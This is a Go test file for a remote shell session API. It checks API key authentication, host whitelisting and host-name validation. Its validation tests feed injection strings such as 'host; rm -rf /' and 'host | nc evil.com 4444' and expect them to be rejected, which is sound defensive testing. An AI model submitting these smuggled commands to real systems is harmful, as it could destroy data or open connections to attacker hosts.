package api

import (
	"bytes"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"testing"
	"time"

	"github.com/gin-gonic/gin"

	"github.com/fimreal/psh/internal/audit"
)

func init() {
	gin.SetMode(gin.TestMode)
}

func newTestHandler() (*Handler, *SessionManager) {
	sm := NewSessionManager(10*time.Minute, 1*time.Hour)
	// Disabled audit logger for tests
	al, _ := audit.NewLogger("", audit.LevelOff)
	apiKeys := map[string]APIKeyConfig{
		"test-key-123": {Key: "test-key-123", Identifier: "test-key"},
	}
	h := NewHandler(sm, al, apiKeys, []string{"testhost", "web01"}, 300*time.Second)
	return h, sm
}

func setupRouter(h *Handler) *gin.Engine {
	r := gin.New()
	h.RegisterRoutes(r, nil)
	return r
}

func TestAPIKeyAuth_MissingHeader(t *testing.T) {
	h, sm := newTestHandler()
	defer sm.Close()
	r := setupRouter(h)

	req := httptest.NewRequest(http.MethodGet, "/api/v1/sessions", nil)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	if w.Code != http.StatusUnauthorized {
		t.Errorf("expected 401, got %d", w.Code)
	}
}

func TestAPIKeyAuth_InvalidKey(t *testing.T) {
	h, sm := newTestHandler()
	defer sm.Close()
	r := setupRouter(h)

	req := httptest.NewRequest(http.MethodGet, "/api/v1/sessions", nil)
	req.Header.Set("Authorization", "Bearer wrong-key")
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	if w.Code != http.StatusUnauthorized {
		t.Errorf("expected 401, got %d", w.Code)
	}
}

func TestAPIKeyAuth_InvalidFormat(t *testing.T) {
	h, sm := newTestHandler()
	defer sm.Close()
	r := setupRouter(h)

	req := httptest.NewRequest(http.MethodGet, "/api/v1/sessions", nil)
	req.Header.Set("Authorization", "Basic dXNlcjpwYXNz")
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	if w.Code != http.StatusUnauthorized {
		t.Errorf("expected 401, got %d", w.Code)
	}
}

func TestListSessions_Empty(t *testing.T) {
	h, sm := newTestHandler()
	defer sm.Close()
	r := setupRouter(h)

	req := httptest.NewRequest(http.MethodGet, "/api/v1/sessions", nil)
	req.Header.Set("Authorization", "Bearer test-key-123")
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Errorf("expected 200, got %d", w.Code)
	}

	var resp map[string]interface{}
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatalf("failed to parse response: %v", err)
	}
	if resp["count"].(float64) != 0 {
		t.Errorf("expected count 0, got %v", resp["count"])
	}
}

func TestCreateSession_NonWhitelistedHost(t *testing.T) {
	h, sm := newTestHandler()
	defer sm.Close()
	r := setupRouter(h)

	body, _ := json.Marshal(CreateSessionRequest{Host: "evil-host"})
	req := httptest.NewRequest(http.MethodPost, "/api/v1/sessions", bytes.NewReader(body))
	req.Header.Set("Authorization", "Bearer test-key-123")
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	if w.Code != http.StatusForbidden {
		t.Errorf("expected 403, got %d, body: %s", w.Code, w.Body.String())
	}
}

func TestCreateSession_MissingHost(t *testing.T) {
	h, sm := newTestHandler()
	defer sm.Close()
	r := setupRouter(h)

	body, _ := json.Marshal(map[string]string{})
	req := httptest.NewRequest(http.MethodPost, "/api/v1/sessions", bytes.NewReader(body))
	req.Header.Set("Authorization", "Bearer test-key-123")
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	if w.Code != http.StatusBadRequest {
		t.Errorf("expected 400, got %d", w.Code)
	}
}

func TestCreateSession_InvalidHostFormat(t *testing.T) {
	h, sm := newTestHandler()
	defer sm.Close()
	r := setupRouter(h)

	body, _ := json.Marshal(CreateSessionRequest{Host: "host; rm -rf /"})
	req := httptest.NewRequest(http.MethodPost, "/api/v1/sessions", bytes.NewReader(body))
	req.Header.Set("Authorization", "Bearer test-key-123")
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	// Should be rejected either by format validation (400) or whitelist (403)
	if w.Code != http.StatusBadRequest && w.Code != http.StatusForbidden {
		t.Errorf("expected 400 or 403, got %d", w.Code)
	}
}

func TestGetSession_NotFound(t *testing.T) {
	h, sm := newTestHandler()
	defer sm.Close()
	r := setupRouter(h)

	req := httptest.NewRequest(http.MethodGet, "/api/v1/sessions/nonexistent", nil)
	req.Header.Set("Authorization", "Bearer test-key-123")
	req.Header.Set("X-Session-Key", "some-key")
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	if w.Code != http.StatusNotFound {
		t.Errorf("expected 404, got %d", w.Code)
	}
}

func TestExecSession_MissingSessionKey(t *testing.T) {
	h, sm := newTestHandler()
	defer sm.Close()
	r := setupRouter(h)

	body, _ := json.Marshal(ExecRequest{Command: "ls"})
	req := httptest.NewRequest(http.MethodPost, "/api/v1/sessions/someid/exec", bytes.NewReader(body))
	req.Header.Set("Authorization", "Bearer test-key-123")
	// No X-Session-Key header
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	// Session not found (404) because "someid" doesn't exist
	if w.Code != http.StatusNotFound {
		t.Errorf("expected 404, got %d", w.Code)
	}
}

func TestIsValidHost(t *testing.T) {
	tests := []struct {
		host  string
		valid bool
	}{
		{"web01", true},
		{"192.168.1.1", true},
		{"my-host.example.com", true},
		{"", false},
		{"host; rm -rf /", false},
		{"host | nc evil.com 4444", false},
		{"host`id`", false},
		{"host$(whoami)", false},
		{"host&bg", false},
	}

	for _, tt := range tests {
		got := isValidHost(tt.host)
		if got != tt.valid {
			t.Errorf("isValidHost(%q) = %v, want %v", tt.host, got, tt.valid)
		}
	}
}

func TestHostWhitelist_PerKey(t *testing.T) {
	sm := NewSessionManager(10*time.Minute, 1*time.Hour)
	defer sm.Close()
	al, _ := audit.NewLogger("", audit.LevelOff)

	apiKeys := map[string]APIKeyConfig{
		"restricted-key": {
			Key:          "restricted-key",
			Identifier:   "restricted",
			AllowedHosts: []string{"only-this-host"},
		},
	}
	h := NewHandler(sm, al, apiKeys, []string{"global-host"}, 300*time.Second)

	// Per-key whitelist: only-this-host should be allowed
	if !h.isHostAllowed("only-this-host", apiKeys["restricted-key"]) {
		t.Error("expected per-key host to be allowed")
	}
	// Global host should NOT be allowed for restricted key
	if h.isHostAllowed("global-host", apiKeys["restricted-key"]) {
		t.Error("expected global host to be denied for restricted key")
	}
}
